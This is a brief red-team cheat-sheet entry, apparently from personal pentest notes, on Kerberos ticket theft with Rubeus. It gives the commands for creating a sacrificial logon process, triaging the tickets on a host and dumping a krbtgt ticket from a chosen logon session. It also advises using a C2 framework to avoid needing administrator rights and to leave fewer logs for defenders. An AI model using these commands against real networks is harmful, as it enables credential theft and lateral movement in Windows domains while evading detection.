

> [!danger] Create Sacrificial Process
> This will need administrator privileges if you use rubeus and it we wil generate alerts for blue team. Use C2 framework because they don't require administrator and make less logs.

```powershell
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show # create Sacrificial Processes
.\Rubeus.exe triage # look at all ticket that we can import. This needs administrator privileges as NT SYSTEM to list it.
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap # Extract tickets of specific process.

```
